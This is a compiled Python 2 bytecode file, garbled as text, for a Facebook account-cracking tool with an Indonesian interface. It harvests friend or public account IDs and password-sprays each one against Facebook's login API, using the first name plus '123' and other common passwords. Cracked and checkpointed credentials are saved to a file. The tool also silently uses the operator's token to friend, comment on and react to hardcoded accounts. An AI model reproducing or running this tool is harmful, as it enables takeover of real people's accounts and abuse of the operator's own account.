ó
Aî_c           @   sÌ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z y d  d l Z Wn e k
 rÐ e  j d  n Xy d  d l Z Wn e k
 re  j d  n Xy d  d l Z Wn+ e k
 r?e  j d  e  j d  n Xd  d l m Z d  d l m Z e e  e j d	  e j   Z e j e  e j e j j   d
 d d d f g e _ d   Z d   Z  d   Z! d   Z" d Z# d   Z$ d Z% g  Z& g  Z' g  a( g  a) g  Z* g  Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 g  Z2 d Z3 d Z4 d   Z5 d   Z6 d   Z7 d   Z8 d   Z9 d   Z: d   Z; d   Z< d   Z= d    Z> e? d! k rÈe;   e5   n  d S("   iÿÿÿÿN(   t
   ThreadPools   pip2 install mechanizes   pip2 install bs4s   pip2 install requestss   python2 crack.py(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   HASH/Bs4.pyR      s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   HASH/Bs4.pyt   acak$   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR   s   !%ss   %s;i   R	   s   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   HASH/Bs4.pyR   ,   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸®?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   HASH/Bs4.pyt   jalan6   s    st  
[1;91m _____   _____        _____   _____   _   _  
[1;91m |  ___| |  _  \      |  _  \ /  ___/ | | | | 
[1;91m | |__   | |_| |      | |_| | | |___  | |_| | 
[1;91m |  __|  |  _  {      |  _  { \___  \ \___  | 
[1;91m | |     | |_| |      | |_| |  ___| |     | | 
[1;91m |_|     |_____/      |_____/ /_____/     |_|  v1.0
							[1;91m iraq the best  ð®ð¶ð¤
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s5   [1;97m[[1;93mâ[1;97m][1;93m Lagi Login[1;97m i   (   R   R   R   R   R   (   t   titikt   o(    (    s   HASH/Bs4.pyt   tikG   s
      i    s   Not Vulnt   Vulnc           C   s;   t  j d  t GHd GHd GHd GHd GHd GHd GHt   d  S(   Nt   clears   [1;33mââââââââââââââââââââââââââââââââââââââââââââsI   [1;33mâ[[1;31;1m01[1;33m][37;1mLogin Email / ID Facebook [1;33mâsJ   [1;33mâ[[1;31;1m02[1;33m][37;1mLogin  Token Facebook      [1;33mâsU   [1;33mâ[[1;31;1m03[1;33m][37;1mAmbil Token                           [1;33mâsS   [1;33mâ[[1;31;1m00[1;33m][37;1mexit                                [1;33mâs   [1;33mââââââââââââââââââââââââââââââââââââââââââââ(   R   t   systemt   logot   pilih_masuk(    (    (    s   HASH/Bs4.pyt   masuk_   s    c          C   s¿   t  d  }  |  d k r' d GHt   n |  d k s? |  d k rI t   nr |  d k sa |  d k rk t   nP |  d k s |  d	 k r t   n. |  d
 k s¥ |  d k r¯ t   n d GHt   d  S(   Ns    [1;93mBY ReKuShE [91m:[1;96m R	   s5   [37;1m[[32;1m![37;1m] No pl'z choose one options !t   1t   01t   2t   02t   3t   03t   0t   00(   t	   raw_inputR'   t   logint   tokenzt   Ambil_TokenR   (   t   msuk(    (    s   HASH/Bs4.pyR'   j   s    




c          C   s¤  t  j d  y t d d  }  t   Wnvt t f k
 rt  j d  t GHd GHt d  } t d  } t   y t	 j d  Wn  t
 j k
 r¦ d GHt   n Xt t	 j _ t	 j d	 d
  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rAyd | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d"  } | j |  | j   } | j i | d# 6 d$ } t j | d% | } t j | j  }	 t d d&  }
 |
 j |	 d'  |
 j   d( GHt  j d)  t   WqAt j  j! k
 r=d GHt   qAXn  d* | k rvd+ GHt  j d,  t" j# d-  t   q d. GHt  j d,  t" j# d-  t$   n Xd  S(/   NR$   s	   login.txtt   rsS   [1;97m[[1;96mð¤¡[1;97m] LOGIN account FACEBOOK ANDA [1;97m[[1;96mð¤¡[1;97m]s&   [[1;95m+[1;97m] ID / Email =[1;92m s+   [1;97m[[1;95m?[1;97m] Password =[1;92m s   https://m.facebook.coms   
[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR)   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR/   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens1   
[1;97m[[1;92mâ[1;97m][1;92m Login Berhasils/   xdg-open https://m.facebook.com/user.keramat.90t
   checkpointsC   
[1;97m[[1;93m![1;97m][1;93m Sepertinya account Anda Checkpoints   rm -rf login.txti   s7   
[1;97m[[1;91m![1;97m][1;91m Password / Email Salah(%   R   R%   t   opent   menut   KeyErrort   IOErrorR&   R1   R"   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet	   bot_koment
   exceptionsR   R   R   R(   (   t   tokett   idt   pwdt   urlRH   t   dataR   t   aR6   R   t   unikers(    (    s   HASH/Bs4.pyR2   |   sf    
S

c          C   sÁ   t  j d  t GHt d  }  yr t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   d GHt  j d  t   Wn* t k
 r¼ d	 GHt j d
  t   n Xd  S(   NR$   s/   [1;97m[[1;95m?[1;97m] [1;93mToken : [1;96ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s0   [1;97m[[1;92mâ[1;97m][1;92m Login Berhasils>   xdg-open https://youtube.com/channel/UCCgmIKpPgUOQauZ3IvrchBA s-   [1;97m[[1;91m![1;97m] [1;91mToken Salah !i   (   R   R%   R&   R1   R^   R_   R`   Ra   Rb   RL   R   Rc   Rd   RN   R   R   R(   (   Rf   t   otwRk   t   namat   zedd(    (    s   HASH/Bs4.pyR3   ³   s"    

c          C   s  y t  d d  j   }  Wn# t k
 r> d GHt j d  n Xd } d } d } d } d } d	 } d
 } t j d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t   d  S(   Ns	   login.txtR6   s   [1;97m[!] Token invalids   rm -rf login.txtt   100005789553399s)   GUE PAKE SCRIPT LU NENG MILA ðððt   ANGRYt   1190012567868384s"   KREN SUKSES SELALU YA ðððt   LOVEs7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   RL   t   readRO   R   R%   R^   t   postRM   (   Rf   t   unat   komt   reacRv   t   post2t   kom2t   reac2(    (    s   HASH/Bs4.pyRd   Ç   s$    !!!!c           C   sU   t  j d  t GHt d  t  j d  t d  t  j d  t d  t   d  S(   NR$   s   [1;92mInstall...s   cd ... && npm installs   [1;96mMulai...s   cd ... && npm starts   
[ Kembali ](   R   R%   R&   R   R1   R(   (    (    (    s   HASH/Bs4.pyR4   Ü   s    


c          C   s[  t  j d  y t d d  j   }  Wn2 t k
 rZ t  j d  t  j d  t   n Xy= t j d |   } t j	 | j
  } | d } | d } Wnf t k
 rÞ t  j d  d GHt  j d  t j d	  t   n# t j j k
 r d
 GHt   n Xt  j d  t GHd GHd GHd | GHd | GHd | d GHd GHd GHd GHd GHt   d  S(   NR$   s	   login.txtR6   s   rm -rf login.txts+   https://graph.facebook.com/me?access_token=Rm   Rg   s   [1;96m[!] [1;91mToken invalidi   s   [!] Tidak ada koneksis3   [1;31;1m==========================================s1   [37;1m==========================================sD   [1;97m[[1;34mâ[1;97m][1;34m Nama account[1;91m     =>[1;93m sA   [1;97m[[1;34mâ¢[1;97m][1;34m UID[1;91m           =>[1;93m s?   [1;97m[[1;34m+[1;97m][1;34m Tanggal Lahir[1;91m =>[1;93m t   birthdaysY   [37;96mâââââââââââââââââââââââââââsL   [37;96mâ[[1;31;1m01[37;96m][1;31;1m->[37;1mCrack ID IRAQI [37;96mâsN   [37;96mâ[[1;31;1m02[37;96m][1;31;1m->[37;1mexit             [37;96mâsY   [37;96mâââââââââââââââââââââââââââ(   R   R%   RL   Ru   RO   R(   R^   R_   R`   Ra   Rb   RN   R   R   Re   R   R   R&   t   pilih(   Rf   Rn   Rk   Ro   Rg   (    (    s   HASH/Bs4.pyRM   ç   sB    

		c          C   s   t  d  }  |  d k r' d GHt   nt |  d k s? |  d k rI t   nR |  d k sa |  d k r t j d  t d	  t j d
  t   n d GHt   d  S(   Ns    [1;93mBY ReKuShE [91m:[1;96m R	   s<   [1;97m[[1;91m![1;97m][1;97m No pl'z choose one options !R)   R*   R/   R0   R$   s   Menghapus tokens   rm -rf login.txt(   R1   R~   t   indoR   R%   R   R   (   Rl   (    (    s   HASH/Bs4.pyR~     s    



c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR$   s	   login.txtR6   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   sh   [37;96mââââââââââââââââââââââââââââââââsK   [37;96mâ[1;34m[01][1;31;1m->[37;1mCrack Dari Daftar Teman [37;96mâsK   [37;96mâ[1;34m[02][1;31;1m->[37;1mCrack Dari ID Publik    [37;96mâsK   [37;96mâ[1;34m[03][1;31;1m->[37;1mCrack Dari File         [37;96mâsH   [37;96mâ[1;34m[00][1;31;1m->[37;1mexit                 [37;96mâsh   [37;96mââââââââââââââââââââââââââââââââ(   R   R%   RL   Ru   Rf   RO   R   R   R   R&   t
   pilih_indo(    (    (    s   HASH/Bs4.pyR     s"    c          C   s  t  d  }  |  d k r' d GHt   n|  d k p< |  d k r¤ t j d  t GHd GHt j d t  } t j	 | j
  } x# | d	 D] } t j | d
  q Wn|  d k p¹ |  d k rÄt j d  t GHd GHd GHt  d  } y> t j d | d t  } t j	 | j
  } d | d GHWnI t k
 rKd GHt  d  t   n# t j j k
 rmd GHt   n Xt j d | d t  } t j	 | j
  } x# | d	 D] } t j | d
  q¦Wnì |  d k pÙ|  d k rt j d  t GHyH d GHt  d  } x0 t | d  j   D] }	 t j |	 j    qWWnF t k
 rXd GHt  d  n' t k
 r~d GHt  d  t   n Xn. |  d k p|  d k r¤t   n d GHt   d  t t t   GHd! GHd" d# d$ g }
 x0 |
 D]( } d% | Gt j j   t j d&  qàWd' GHd( GHd) GHd* GHd+   } t d,  } | j | t  d- GHd. GHd/ t t t    d0 t t t!   GHd1 GHd- GHt  d2  t j d3  d  S(4   Ns    [1;93mBY ReKuShE [91m:[1;96m R	   s<   [1;97m[[1;91m![1;97m][1;97m No pl'z choose one options !R)   R*   R$   s3   [1;31;1m==========================================s3   https://graph.facebook.com/me/friends?access_token=Rj   Rg   R+   R,   s1   [37;1m==========================================s-   [1;97m{[1;34mâ[1;97m} ID publik/teman : s   https://graph.facebook.com/s   ?access_token=s"   [1;97m{[1;93mâ´[1;97m} Nama : Rm   s4   [1;97m[[1;93m![1;97m] ID publik/teman tidak ada !s   
[ Kembali ]s   [!] Tidak ada koneksi !s   /friends?access_token=R-   R.   s%   [1;97m{[1;93m?[1;97m} Nama File : R6   s   [1;97m[!] File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s   [1;97m[!] File tidak ada !R/   R0   s&   [1;97m{[1;93mâ¹[1;97m} Total ID : s&   [1;97m{[1;93mâ¹[1;97m} Stop CTRL+Zs   .   s   ..  s   ... s+   [1;97m{[1;93mâ¹[1;97m} Crack Berjalan i   s4   
[1;31;1m==========================================s2   
[1;96mJANGAN MENYALAH GUNAKAN SCRIPT INI YA BOSSs   
[1;33mBY ReKuShEs2   
[37;1m==========================================c         S   s¥  |  } y t  j d  Wn t k
 r* n Xylt j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d GHd | d GHd | GHd | d GHd | d GHt j | |  nyd | d k r¬d GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nê| d d }
 t	 j
 d | d |
 d  } t j |  } d	 | k rnt j d | d
 | d	  } t j | j  } d GHd  | d GHd! | GHd" |
 d GHd | d GHt j | |
  n(d | d k rýd GHd | d GHd | GHd |
 d GHd | d GHt d d  }	 |	 j d | d |
 d  |	 j   t j | |
  n| d d# } t	 j
 d | d | d  } t j |  } d	 | k r¿t j d | d
 | d	  } t j | j  } d GHd  | d GHd! | GHd" | d GHd | d GHt j | |  n×
d | d k rNd GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nH
d$ } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d GHd  | d GHd! | GHd | d GHd | d GHt j | |  n	d | d k rd GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nÿd% } t	 j
 d | d | d  } t j |  } d	 | k rQt j d | d
 | d	  } t j | j  } d GHd  | d GHd! | GHd | d GHd | d GHt j | |  nEd | d k ràd GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  n¶d& } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d GHd  | d GHd! | GHd | d GHd | d GHt j | |  nüd | d k r)d GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nmd' } t	 j
 d | d | d  } t j |  } d	 | k rãt j d | d
 | d	  } t j | j  } d GHd  | d GHd | GHd | d GHd | d GHt j | |  n³d | d k rr	d GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  n$d( } t	 j
 d | d | d  } t j |  } d	 | k r,
t j d | d
 | d	  } t j | j  } d GHd  | d GHd | GHd | d GHd | d GHt j | |  njd | d k r»
d GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nÛd) } t	 j
 d | d | d  } t j |  } d	 | k rut j d | d
 | d	  } t j | j  } d GHd  | d GHd | GHd | d GHd | d GHt j | |  n!d | d k rd GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nd* } t	 j
 d | d | d  } t j |  } d	 | k r¾t j d | d
 | d	  } t j | j  } d GHd  | d GHd | GHd | d GHd | d GHt j | |  nØd | d k rMd GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  nId( } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d GHd  | d GHd | GHd | d GHd | d GHt j | |  n d | d k rd GHd | d GHd | GHd | d GHd | d GHt d d  }	 |	 j d | d | d  |	 j   t j | |  n  Wn n Xd  S(+   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RJ   s   ?access_token=s   [1;33m[â] [1;33mBerhasils1   [1;33m[â´] [1;33mName [1;33m    : [1;33mRm   s1   [1;33m[â¹] [1;33mID [1;33m      : [1;33ms1   [1;33m[â¹] [1;33mPassword [1;33m: [1;33ms   
s6   [1;33m[â¹] [1;33mTanggal Lahir [1;33m: [1;33mR}   s   www.facebook.comt	   error_msgs    [1;94m[â] [1;94mCheckpoints1   [1;94m[â´] [1;94mName [1;94m    : [1;95ms1   [1;94m[â¹] [1;94mID [1;94m      : [1;95ms1   [1;94m[â¹] [1;94mPassword [1;94m: [1;95ms6   [1;97m[â¹] [1;91mTanggal Lahir [1;91m: [1;92ms   out/super_cp.txtRk   s   ID:s    Pw:t   1234s   [1;94m[â] [1;92mBerhasils1   [1;94m[â´] [1;91mName [1;91m    : [1;92ms1   [1;94m[â¹] [1;91mID [1;91m      : [1;92ms1   [1;94m[â¹] [1;91mPassword [1;91m: [1;92mt   12345t   44445555t   786786t
   1122334455t
   1234512345s   123123@@t	   100200300t   11112222(   R   t   mkdirt   OSErrorR^   R_   Rf   R`   Ra   Rb   t   urllibt   urlopent   loadt   okst   appendRL   R   Rc   t   cekpoint(   t   argt   userRk   t   ct   pass1Rj   R   R   R   t   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9t   pass10t   pass11(    (    s   HASH/Bs4.pyt   maint  sø   		
		
		
		
		
		
		
		
		
		
		
i   s   [1;34mââââââââââââââââââââââââââââââââââââââââââââââââs.   [1;97m[[1;93mâ[1;97m] [1;97mSelesai ....sS   [1;97m[[1;93mâ´[1;97m] [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93msB   [1;97m[[1;93mâ¹[1;97m] [1;97mCP file tersimpan : out/ind1.txts    [1;93m[[1;97m Kembali [1;93m]s   python2 Bs4.py("   R1   R   R   R%   R&   R^   R_   Rf   R`   Ra   Rb   Rg   R   RN   R   Re   R   R   RL   t	   readlinest   stripRO   RM   R   R   R   R   R   R   R   R    t   mapR   R   (   t   teakR6   R   t   st   idtt   jokt   opR   t   idlistt   lineR    R!   R¤   t   p(    (    s   HASH/Bs4.pyR   1  s    




  	ÿ )
t   __main__(@   R   R   R   t   datetimeR   RZ   t   ret	   threadingR`   t   getpassR   t	   cookielibt   multiprocessing.poolR    RQ   t   ImportErrorR%   t   bs4R^   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRP   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R&   R"   t   backt   threadst   berhasilR   R   t   oket   cpeRg   t   usernamet   idtemant   idfromtemant   gagalt   reaksit   koment   vulnott   vulnR(   R'   R2   R3   Rd   R4   RM   R~   R   R   t   __name__(    (    (    s   HASH/Bs4.pyt   <module>   st   
			
					7				$			ÿ e